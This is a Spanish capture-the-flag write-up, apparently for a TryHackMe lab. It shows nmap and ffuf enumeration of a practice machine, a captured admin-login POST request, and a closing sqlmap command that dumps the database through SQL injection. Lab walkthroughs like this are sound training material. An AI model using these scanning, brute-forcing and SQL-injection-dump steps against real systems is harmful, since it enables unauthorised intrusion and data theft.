# Introducción

Este reto esta echo para evaluar skills de red team. 

Utilizaremos estas herramientas:

- Nmap
- Sqlmap
- Wordlistt
- PHP Shell

# Enumeración

Test conectividad + SO

```
ping 10.10.173.53
PING 10.10.173.53 (10.10.173.53) 56(84) bytes of data.
64 bytes from 10.10.173.53: icmp_seq=1 ttl=64 time=2.11 ms
64 bytes from 10.10.173.53: icmp_seq=2 ttl=64 time=0.417 ms
^C
--- 10.10.173.53 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 0.417/1.265/2.113/0.848 ms
```

Como podemos ver ttl=64 es un linux

Escaner puertos

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.173.53

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-27 12:00 BST
Nmap scan report for ip-10-10-173-53.eu-west-1.compute.internal (10.10.173.53)
Host is up (0.00045s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.229.254
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
53/tcp open  domain  ISC BIND 9.16.1-Ubuntu
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
MAC Address: 02:7F:25:35:DC:2B (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.99 seconds
```

Como podemos ver tenemos 3 puertos abiertos

- FTP 21 - con Anonymous activo
- SSH 22
- 53 Parece ser el mismo dominio con 9.16.1 Ubuntu

Me he conectado a dicho puerto 21 con anonymous y no he encontrado completamente nada. con lo cuál pasamos a otro puerto a ver si encontramos algo.

También podríamos hacer otro escaner de puertos mas enfocado en otros puertos UDP o de firewall.

```
sudo nmap -p- --min-rate 4000 10.10.173.53

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-27 12:03 BST
Nmap scan report for ip-10-10-173-53.eu-west-1.compute.internal (10.10.173.53)
Host is up (0.00042s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
1337/tcp open  waste
1883/tcp open  mqtt
MAC Address: 02:7F:25:35:DC:2B (Unknown)
```

Cosa que hemos encontrado

- 1337
- 1883

Vamos a hacer otro escaner centrado en esos dos puertos encontrados

```
sudo nmap -p 1337,1883 -sCV -T4 --min-rate 4000 10.10.173.53

Starting Nmap 7.60 ( https://nmap.org ) at 2024-09-27 12:05 BST
Nmap scan report for ip-10-10-173-53.eu-west-1.compute.internal (10.10.173.53)
Host is up (0.00018s latency).

PORT     STATE SERVICE                 VERSION
1337/tcp open  http                    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: EXPOSED
1883/tcp open  mosquitto version 1.6.9
| mqtt-subscribe: 
|   Topics and their most recent payloads: 
|     $SYS/broker/load/messages/received/15min: 0.07
|     $SYS/broker/load/bytes/received/15min: 1.19
|     $SYS/broker/load/connections/15min: 0.07
|     $SYS/broker/load/sockets/5min: 0.20
|     $SYS/broker/load/bytes/sent/15min: 0.27
|     $SYS/broker/load/messages/sent/1min: 0.91
|     $SYS/broker/load/bytes/received/5min: 3.53
|     $SYS/broker/load/sockets/1min: 0.91
|     $SYS/broker/bytes/sent: 4
|     $SYS/broker/store/messages/bytes: 179
|     $SYS/broker/messages/sent: 1
|     $SYS/broker/messages/received: 1
|     $SYS/broker/heap/maximum: 49688
|     $SYS/broker/load/messages/sent/5min: 0.20
|     $SYS/broker/version: mosquitto version 1.6.9
|     $SYS/broker/uptime: 506 seconds
|     $SYS/broker/load/bytes/sent/5min: 0.79
|     $SYS/broker/load/sockets/15min: 0.07
|     $SYS/broker/bytes/received: 18
|     $SYS/broker/load/messages/received/5min: 0.20
|     $SYS/broker/load/connections/5min: 0.20
|     $SYS/broker/load/messages/received/1min: 0.91
|     $SYS/broker/load/bytes/sent/1min: 3.65
|     $SYS/broker/load/messages/sent/15min: 0.07
|     $SYS/broker/load/connections/1min: 0.91
|_    $SYS/broker/load/bytes/received/1min: 16.45
MAC Address: 02:7F:25:35:DC:2B (Unknown)
```

Parece ser que hemos encontrado un http en el puerto 1337 genial

Vemos que en el 1883 encontramos "mosquitto con la versión 1.6.9"

Vamos a enumerar la web a ver si encontramos algo.


![image](https://github.com/user-attachments/assets/a62c6e30-3205-457d-a32f-9a2fcbf586b5)

Vamos a hacer un escáner de directorios a ver si encontramos algo porque en el código fuente no encontramos nada

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.173.53:1337/FUZZ
javascript
phpmyadmin
admin
admin_101
```

![image](https://github.com/user-attachments/assets/f9f39367-2836-482a-bbf9-0ed69eb196dd)

Hemos encontrado un logeo en la base de datos de phpmyadmin, lo primero que podemos hacer es probar las credenciales por default de phpmyadmin 

He probado la por default y nada vamos a probar otro directorio como admin_101

![image](https://github.com/user-attachments/assets/61c51bee-5575-4104-9026-c1189e20acbd)

Vaya parece ser que tenemos un email puesto ya

"hacker@root.thm"

Jugando un poco tiene toda la pinta de haber un SQL Injection Vamos a hacer pruebas con SqlMap

Coguemos la request de burp para el post

```
cat request 
POST /admin_101/includes/user_login.php HTTP/1.1
Host: 10.10.173.53:1337
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 37
Origin: http://10.10.173.53:1337
Connection: close
Referer: http://10.10.173.53:1337/admin_101/
Cookie: PHPSESSID=olsjcph1jraqlnncm1n6c8nfaf

email=hacker%40root.thm&password=asdf
```

Vamos a hacer el sql map

```
sqlmap -r request --dump
```







